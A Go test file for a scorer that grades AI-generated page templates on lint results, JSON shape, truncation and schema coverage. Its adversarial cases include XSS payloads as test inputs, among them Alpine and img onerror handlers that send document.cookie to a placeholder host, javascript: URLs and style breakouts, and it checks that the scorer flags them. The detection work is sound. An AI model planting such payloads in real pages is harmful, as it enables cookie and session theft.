package templateeval

import (
	"context"
	"encoding/json"
	"reflect"
	"strings"
	"testing"
	"time"

	"mahresources/application_context"
	"mahresources/mrql"
	"mahresources/shortcodes"
)

func pairCase() Case {
	return Case{ID: "t-pair", Kind: KindPair, Carrier: "group", Slot: "CustomHeader", Prompt: "x"}
}

func pairDraft(html, css string, issues ...shortcodes.LintIssue) Draft {
	return Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": html, "CustomHeaderCSS": css}, Issues: issues}
}

func okPreview(html string) map[string]Preview {
	return map[string]Preview{"CustomHeader": {Status: 200, HTML: html}}
}

func TestScoreChecks(t *testing.T) {
	known := shortcodes.KnownFromBuiltins()
	metaCase := Case{ID: "t-meta", Kind: KindMetaSchema, Carrier: "group", Prompt: "x", ExpectFields: []string{"isbn"}}
	metaDraft := func(schema string) Draft {
		return Draft{Status: 200, Target: "metaschema", Valid: true, Content: schema}
	}
	advCase := pairCase()
	advCase.Adversarial = true
	cssCase := Case{ID: "t-css", Kind: KindSlot, Carrier: "group", Slot: "CustomCSS", Prompt: "x"}
	bundleCase := Case{ID: "t-bundle", Kind: KindBundle, Carrier: "note", Prompt: "x"}
	expectBundle := Case{ID: "t-bundle-expect", Kind: KindBundle, Carrier: "note", Prompt: "x", ExpectSlots: []string{"CustomHeader", "CustomSidebar"}}

	tests := []struct {
		name     string
		c        Case
		draft    Draft
		calls    []Call
		previews map[string]Preview
		check    func(t *testing.T, got Checks, details Details)
		pass     bool
	}{
		{
			name: "clean pair passes", c: pairCase(),
			draft:    pairDraft(`<h1>[meta path="author"]</h1>`, `.h{}`),
			previews: okPreview(`<h1>Ann</h1>`),
			pass:     true,
		},
		{
			name: "provider error", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			check: func(t *testing.T, got Checks, details Details) {
				if details.ProviderError == "" || got.HTTPStatus != 502 {
					t.Fatalf("provider error not recorded: %#v", got)
				}
			},
		},
		{
			name: "lint errors and warnings", c: pairCase(),
			draft: pairDraft(`<h1>x</h1>`, ``,
				shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "[conditional] must be a block: [conditional]…[/conditional]"},
				shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `[meta] has both hide-empty and default; hide-empty wins and the default is never shown`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.LintErrors != 1 || got.LintWarnings != 1 {
					t.Fatalf("lint counts = %d/%d", got.LintErrors, got.LintWarnings)
				}
			},
		},
		{
			name: "unknown attribute warning does not fail", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `unknown attribute "colour" on [meta]`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.UnknownAttributes != 1 {
					t.Fatalf("unknown attributes = %d", got.UnknownAttributes)
				}
			},
			pass: true,
		},
		{
			name: "MRQL error", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.MRQLErrors != 1 {
					t.Fatalf("mrql errors = %d", got.MRQLErrors)
				}
			},
		},
		{
			name: "unknown shortcode far from any built-in", c: pairCase(),
			draft:    pairDraft(`<div>[star-rating value="4"] [meta path="a"] [plugin:x:y] [/rating]</div>`, `a[href]{} [data-x="y"]{}`),
			previews: okPreview(`<div>stars</div>`),
			check: func(t *testing.T, got Checks, details Details) {
				want := []string{"plugin:x:y", "rating", "star-rating"}
				if !reflect.DeepEqual(details.UnknownShortcodes, want) {
					t.Fatalf("unknown shortcodes = %v, want %v", details.UnknownShortcodes, want)
				}
			},
		},
		{
			name: "CSS attribute selectors are not shortcodes", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Valid: true, Content: `[hidden]{display:none} input[type="text"]{} [data-theme="dark"] .x{}`},
			pass:  true,
		},
		{
			name: "metaschema compile failure", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"nope"}}}`),
			check: func(t *testing.T, got Checks, details Details) {
				if !got.SchemaCompileFailed || details.SchemaCompileError == "" {
					t.Fatal("compile failure not recorded")
				}
			},
		},
		{
			name: "fixture meta fails generated schema", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"string"}},"required":["isbn","missingField"]}`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.FixtureMetaInvalid == 0 {
					t.Fatal("fixture validation failure not counted")
				}
			},
		},
		{
			name: "empty schema cannot pass", c: metaCase,
			draft: metaDraft(`{}`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.SchemaProperties != 0 || len(got.MissingExpectFields) != 1 {
					t.Fatalf("got %#v", got)
				}
			},
		},
		{
			name: "schema missing an expected field", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.MissingExpectFields, []string{"isbn"}) {
					t.Fatalf("missing = %v", got.MissingExpectFields)
				}
			},
		},
		{
			name: "schema with the expected field passes", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"},"isbn":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.FieldCoverage != 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "incomplete pair in the raw provider output", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"<p>x</p>"},"explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.IncompletePairs != 1 {
					t.Fatalf("incomplete pairs = %d", got.IncompletePairs)
				}
			},
		},
		{
			name: "bundle coverage", c: bundleCase,
			draft:    Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": "<p>x</p>", "CustomHeaderCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.RequestedSlots != len(BundleSlots("note")) || got.ReturnedSlots != 2 || got.BundleCoverage <= 0 || got.BundleCoverage >= 1 {
					t.Fatalf("coverage %#v", got)
				}
			},
			pass: true,
		},
		{
			name: "truncation from finish reason", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``),
			calls:    []Call{{FinishReason: "length"}},
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated {
					t.Fatal("truncation not detected")
				}
			},
		},
		{
			name: "the bundle degrade issue after a clean stop is malformed, not truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"<p>`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Truncated || !got.Malformed || got.LintErrors != 0 {
					t.Fatalf("truncated=%v malformed=%v lint=%d", got.Truncated, got.Malformed, got.LintErrors)
				}
			},
		},
		{
			name: "the bundle degrade issue after a length stop is truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "length", Content: `{"slots":{"CustomHeader":"<p>`}},
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated || got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "invalid JSON from a single target is malformed", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content": ".a{`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Truncated || !got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "a bundle slot cut at the content cap is truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{
				"CustomHeader": "<p>" + strings.Repeat("x", application_context.MaxTemplateGeneratedContentLength-3), "CustomHeaderCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated {
					t.Fatal("a sliced slot was not counted as truncated")
				}
			},
		},
		{
			name: "an oversized single draft is truncated", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content":"` + strings.Repeat("a", application_context.MaxTemplateGeneratedContentLength+1) + `","explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated || got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "an empty requested pair fails", c: pairCase(),
			draft: pairDraft(``, ``),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.MissingSlots, []string{"CustomHeader"}) {
					t.Fatalf("missing slots = %v", got.MissingSlots)
				}
			},
		},
		{
			name: "a bundle without an expected slot fails", c: expectBundle,
			draft:    Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": "<p>x</p>", "CustomHeaderCSS": "", "CustomSidebar": " ", "CustomSidebarCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.MissingSlots, []string{"CustomSidebar"}) {
					t.Fatalf("missing slots = %v", got.MissingSlots)
				}
			},
		},
		{
			name: "a bundle may leave unexpected slots empty", c: expectBundle,
			draft: Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{
				"CustomHeader": "<p>x</p>", "CustomHeaderCSS": "", "CustomSidebar": "<p>y</p>", "CustomSidebarCSS": "", "CustomSummary": "", "CustomSummaryCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}, "CustomSidebar": {Status: 200, HTML: "<p>y</p>"}},
			pass:     true,
		},
		{
			name: "style and script bodies are not visible content", c: pairCase(),
			draft:    pairDraft(`<style>.a{color:red}</style>[meta path="none" hide-empty="true"]`, ``),
			previews: okPreview("<style>.a{color:red}</style><script>var a = 1;</script>"),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "an unknown shortcode glued to text in HTML", c: pairCase(),
			draft:    pairDraft(`<p>Rating[star-rating value="4"]</p>`, ``),
			previews: okPreview(`<p>Rating</p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(details.UnknownShortcodes, []string{"star-rating"}) {
					t.Fatalf("unknown shortcodes = %v", details.UnknownShortcodes)
				}
			},
		},
		{
			name: "attribute selectors with spaced operators and style blocks are not shortcodes", c: pairCase(),
			draft:    pairDraft(`<style>[hidden]{display:none} [data-state = "on"]{}</style><p>x</p>`, `[data-state = "on"] .x{} [data-x="y"]{} [hidden]{}`),
			previews: okPreview(`<p>x</p>`),
			pass:     true,
		},
		{
			name: "a shortcode-shaped unknown in CSS is flagged", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Valid: true, Content: `.a{color:[theme-color name="accent"]}`},
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(details.UnknownShortcodes, []string{"theme-color"}) {
					t.Fatalf("unknown shortcodes = %v", details.UnknownShortcodes)
				}
			},
		},
		{
			name: "event handler after a quoted attribute holding >", c: advCase,
			draft:    pairDraft(`<a title="a>b" onclick="x()">t</a>`, ``),
			previews: okPreview(`<a>t</a>`),
			check:    wantFlags("event-handler"),
		},
		{
			name: "unquoted Alpine attribute with a network call", c: advCase,
			draft:    pairDraft(`<div x-init=fetch('/x')>t</div>`, ``),
			previews: okPreview(`<div>t</div>`),
			check:    wantFlags("alpine-network"),
		},
		{
			name: "entity-encoded javascript URL", c: advCase,
			draft:    pairDraft(`<a href="java&#115;cript:alert(1)">t</a><a href=" JAVA&#x09;SCRIPT:x">u</a>`, ``),
			previews: okPreview(`<a>t</a>`),
			check:    wantFlags("javascript-url"),
		},
		{
			name: "srcdoc and embedded content", c: advCase,
			draft:    pairDraft(`<iframe srcdoc="&lt;script&gt;1&lt;/script&gt;"></iframe><object data="x"></object><embed src="y">`, ``),
			previews: okPreview(`<p>t</p>`),
			check:    wantFlags("srcdoc", "embed"),
		},
		{
			name: "markup after a style breakout in CSS is read as HTML", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{}</style><img src=x onerror=alert(1)>`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("event-handler", "style-breakout"),
		},
		{
			name: "render-empty slot", c: pairCase(),
			draft:    pairDraft(`<div class="c"><h2>[meta path="missing" hide-empty="true"]</h2></div>`, ``),
			previews: okPreview("<div class=\"c\"><h2></h2></div>\n<!-- c -->"),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "an image is not empty", c: pairCase(),
			draft:    pairDraft(`<img src="/x">`, ``),
			previews: okPreview(`<img src="/x">`),
			pass:     true,
		},
		{
			name: "leftover shortcode text", c: pairCase(),
			draft:    pairDraft(`<p>[property path="Name"]</p>`, ``),
			previews: okPreview(`<p>[property path=Name]</p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.LeftoverShortcodeText, []string{"CustomHeader"}) {
					t.Fatalf("leftover = %v", got.LeftoverShortcodeText)
				}
			},
		},
		{
			name: "preview error issue and render error marker", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p><span class="mrql-error text-red-700 font-mono">bad</span>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "boom"}}}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.PreviewErrors != 2 {
					t.Fatalf("preview errors = %d", got.PreviewErrors)
				}
			},
		},
		{
			name: "a lint error the preview repeats is counted once, under lint", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}}}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.PreviewErrors != 0 || got.LintErrors != 1 {
					t.Fatalf("preview errors = %d, lint errors = %d", got.PreviewErrors, got.LintErrors)
				}
			},
		},
		{
			name: "field coverage is heuristic and does not gate markup", c: pairCase(),
			draft:    pairDraft(`<p>[meta path="author"]</p>`, ``),
			previews: okPreview(`<p>Ann</p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.FieldCoverage <= 0 || got.FieldCoverage >= 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "script tag flags an adversarial case", c: advCase,
			draft:    pairDraft(`<p>x</p><SCRIPT>fetch('https://example.invalid')</SCRIPT>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
		},
		{
			name: "inline event handler", c: advCase,
			draft:    pairDraft(`<img src="x" onerror="alert(1)">`, ``),
			previews: okPreview(`<img src="x">`),
			check:    wantFlags("event-handler"),
		},
		{
			name: "Alpine attribute with a network call", c: advCase,
			draft:    pairDraft(`<div x-init="fetch('https://example.invalid/?d='+document.cookie)">x</div><button @click="location='https://e.invalid'">b</button>`, ``),
			previews: okPreview(`<div>x</div>`),
			check:    wantFlags("alpine-network"),
		},
		{
			name: "harmless Alpine toggle is not flagged", c: advCase,
			draft:    pairDraft(`<div x-data="{open:false}"><button @click="open = !open">t</button></div>`, ``),
			previews: okPreview(`<div>t</div>`),
			pass:     true,
		},
		{
			name: "javascript URL", c: advCase,
			draft:    pairDraft(`<a href="JavaScript:alert(1)">x</a>`, ``),
			previews: okPreview(`<a>x</a>`),
			check:    wantFlags("javascript-url"),
		},
		{
			name: "style breakout in CSS", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{}</style><div x-init="1">`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("style-breakout"),
		},
		{
			name: "script inside an SVG title is an HTML script", c: advCase,
			draft:    pairDraft(`<svg><title><script>fetch('/x')</script></title></svg>`, ``),
			previews: okPreview(`<svg></svg>`),
			check:    wantFlags("script"),
		},
		{
			name: "markup-looking text in a CSS string is not markup", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.x::after{content:"<script>alert(1)</script>"} .y::before{content:"<img onerror=x>"}`),
			previews: okPreview(`<p>x</p>`),
			pass:     true,
		},
		{
			name: "CSS expression and javascript url", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{width:expression(alert(1))} .b{background:URL( 'javascript:alert(1)')}`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("javascript-url", "css-expression"),
		},
		{
			name: "executable markup in the rendered preview fails an adversarial case", c: advCase,
			draft:    pairDraft(`<p>[meta path="author" inline="true" raw="true"]</p>`, ``),
			previews: okPreview(`<p><img src=x onerror="fetch('https://example.invalid/?c='+document.cookie)"></p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if len(got.ExecutableMarkup) != 0 || !reflect.DeepEqual(got.RenderedExecutableMarkup, []string{"event-handler"}) {
					t.Fatalf("draft flags %v, rendered flags %v", got.ExecutableMarkup, got.RenderedExecutableMarkup)
				}
			},
		},
		{
			name: "an empty meta widget renders nothing", c: pairCase(),
			draft: pairDraft(`<div>[meta path="missing" hide-empty="true"][meta path="gone"]</div>`, ``),
			previews: okPreview(`<div><meta-shortcode data-path="missing" data-hide-empty="true" data-default="" data-value=""></meta-shortcode>` +
				`<meta-shortcode data-path="gone" data-hide-empty="false" data-default="" data-value="null"></meta-shortcode><x-widget><span> </span></x-widget></div>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "a meta widget with a default is visible", c: pairCase(),
			draft:    pairDraft(`<div>[meta path="missing" default="n/a"]</div>`, ``),
			previews: okPreview(`<div><meta-shortcode data-path="missing" data-hide-empty="false" data-default="n/a" data-value=""></meta-shortcode></div>`),
			pass:     true,
		},
		{
			name: "a meta widget with a value is visible", c: pairCase(),
			draft:    pairDraft(`<div>[meta path="author"]</div>`, ``),
			previews: okPreview(`<div><meta-shortcode data-path="author" data-hide-empty="true" data-default="" data-value="&#34;Ann&#34;"></meta-shortcode></div>`),
			pass:     true,
		},
		{
			name: "a custom element with text is visible", c: pairCase(),
			draft:    pairDraft(`<x-badge>[property path="Name"]</x-badge>`, ``),
			previews: okPreview(`<x-badge><b>Dune</b></x-badge>`),
			pass:     true,
		},
		{
			name: "valid JSON of the wrong shape is not malformed", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `[]`}, {FinishReason: "stop", Content: `123`}, {FinishReason: "stop", Content: `"x"`}, {FinishReason: "stop", Content: `{"content":"","explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Malformed || !got.WrongShape {
					t.Fatalf("malformed=%v wrongShape=%v", got.Malformed, got.WrongShape)
				}
			},
		},
		{
			name: "a degraded bundle whose reply is valid JSON is the wrong shape", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "stop", Content: `[]`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Malformed || !got.WrongShape {
					t.Fatalf("malformed=%v wrongShape=%v", got.Malformed, got.WrongShape)
				}
			},
		},
		{
			name: "a pair reply without slots is the wrong shape", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content":"<p>x</p>","explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Malformed || !got.WrongShape {
					t.Fatalf("malformed=%v wrongShape=%v", got.Malformed, got.WrongShape)
				}
			},
		},
		{
			name: "executable markup is recorded but does not gate a normal case", c: pairCase(),
			draft:    pairDraft(`<p>x</p><script>console.log(1)</script>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
			pass:     true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, details := Score(tt.c, tt.draft, tt.calls, tt.previews, known)
			if tt.check != nil {
				tt.check(t, got, details)
			}
			if got.Pass() != tt.pass {
				t.Fatalf("Pass() = %v, want %v; checks %#v", got.Pass(), tt.pass, got)
			}
		})
	}
}

func wantFlags(flags ...string) func(t *testing.T, got Checks, details Details) {
	return func(t *testing.T, got Checks, details Details) {
		t.Helper()
		if !reflect.DeepEqual(got.ExecutableMarkup, flags) {
			t.Fatalf("executable markup = %v, want %v", got.ExecutableMarkup, flags)
		}
	}
}

// TestLintMessagePrefixesStayClassified lints known-bad markup with the real
// linter. Score classifies issues by message prefix, so a rewording in
// shortcodes/lint.go must fail here rather than silently zero a metric.
func TestLintMessagePrefixesStayClassified(t *testing.T) {
	opts := shortcodes.LintOptions{
		Known:        shortcodes.KnownFromBuiltins(),
		ValidateMRQL: func(q string) error { _, err := mrql.Parse(q); return err },
	}
	cases := []struct {
		markup string
		class  issueClass
	}{
		{`[meta path="a" colour="red"]`, classUnknownAttribute},
		{`[mrql query="type = = ="]`, classMRQL},
		{`[metta path="a"]`, classUnknownShortcode},
	}
	for _, c := range cases {
		found := false
		var messages []string
		for _, issue := range shortcodes.Lint(c.markup, opts) {
			messages = append(messages, issue.Message)
			if classifyIssue(issue) == c.class {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: no issue classified as %v; lint said %s", c.markup, c.class, strings.Join(messages, " | "))
		}
	}
}

type malformedProvider struct{}

func (malformedProvider) GenerateDraft(context.Context, string, string, int) (string, error) {
	return `{"slots":{"CustomHeader":"<p>`, nil
}

// TestBundleDegradeMessageStaysClassified drives the real generator into its
// malformed-bundle branch, so a rewording of that message in
// application_context/template_generation.go fails here instead of zeroing the
// malformed and truncation counts.
func TestBundleDegradeMessageStaysClassified(t *testing.T) {
	generator := application_context.NewTemplateGenerator(malformedProvider{}, application_context.TemplateGenerationConfig{APIKey: "k", Timeout: time.Second})
	result, err := generator.GenerateTemplate(context.Background(), application_context.TemplateGenerationInput{
		Target: application_context.TemplateTargetBundle, EntityType: "group", BundleSlots: []string{"CustomHeader", "CustomHeaderCSS"},
	}, "a template")
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Issues) == 0 {
		t.Fatalf("the generator reported no issue for a malformed bundle: %#v", result)
	}
	for _, issue := range result.Issues {
		if classifyIssue(issue) != classBundleDegraded {
			t.Fatalf("degrade message %q is not classified", issue.Message)
		}
	}
}

type fixedProvider string

func (p fixedProvider) GenerateDraft(context.Context, string, string, int) (string, error) {
	return string(p), nil
}

// TestSlicedSlotEndingInWhitespaceIsTruncated runs the production generator on
// a reply whose header is over the cap with whitespace at the cut, so the slot
// it returns is sliced to exactly the cap and ends in spaces.
func TestSlicedSlotEndingInWhitespaceIsTruncated(t *testing.T) {
	max := application_context.MaxTemplateGeneratedContentLength
	header := strings.Repeat("x", max-2) + "    " + strings.Repeat("y", 100)
	reply, _ := json.Marshal(map[string]any{"slots": map[string]string{"CustomHeader": header, "CustomHeaderCSS": ""}, "explanation": "e"})
	generator := application_context.NewTemplateGenerator(fixedProvider(reply), application_context.TemplateGenerationConfig{APIKey: "k", Timeout: time.Second})
	result, err := generator.GenerateTemplate(context.Background(), application_context.TemplateGenerationInput{
		Target: application_context.TemplateTargetBundle, EntityType: "group", BundleSlots: []string{"CustomHeader", "CustomHeaderCSS"},
	}, "a header")
	if err != nil {
		t.Fatal(err)
	}
	if got := result.Slots["CustomHeader"]; len(got) != max || !strings.HasSuffix(got, "  ") {
		t.Fatalf("the generator no longer slices this way (len %d); revisit the truncation check", len(got))
	}
	draft := Draft{Status: 200, Target: result.Target, Slots: result.Slots, Valid: result.Valid, Issues: result.Issues}
	got, _ := Score(pairCase(), draft, []Call{{FinishReason: "stop"}}, okPreview("<p>x</p>"), shortcodes.KnownFromBuiltins())
	if !got.Truncated {
		t.Fatal("a slot sliced at the cap was not counted as truncated")
	}
}
